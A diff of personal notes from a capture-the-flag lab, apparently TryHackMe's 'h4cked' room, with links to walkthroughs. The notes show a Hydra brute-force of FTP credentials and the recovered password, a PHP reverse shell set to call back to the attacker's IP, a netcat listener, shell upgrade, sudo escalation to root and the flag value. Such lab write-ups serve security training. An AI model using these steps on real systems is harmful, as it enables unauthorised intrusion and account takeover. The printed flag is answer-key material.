@@ -1,3 +1,5 @@
+#Task 2 Hack your way back into the machine 
+
 hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.169.250
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -11,9 +13,36 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-07 03:39:
 jenny:987654321
 
 
+ftp>get shell.php
+ftp>exit
+vi shell.php
+change myip vs port
+$ip = '10.6.88.227';  // CHANGE THIS
+$port = 6666;
+ftp>put shell.php
+
+on my machine
+rlwrap nc -lnvp 6666
+curl -s http://10.10.169.250:21/shell.php
+
+on my machine
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+su jenny
+sudo -l
+pass:
+sudo su
+root#ls /root
+root#cd /root/Reptile
+root@wir3:~/Reptile#cat flag.txt
+ebcefd66ca4b559d17b440b6e67fd0fd
+
+
+
 https://netsec.ws/?p=337
 https://infosecwriteups.com/tryhackme-h4cked-walkthrough-71b9ba4bad7d
 https://infosecwriteups.com/h4cked-tryhackme-writeup-cf40463684c8
+https://www.kumaratuljaiswal.in/2021/04/tryhackme-h4cked-walkthrough.html
+https://pwnlab.me/en-h4cked-tryhackme-writeup/ <--ok
 https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
 https://pentestlab.blog/
 
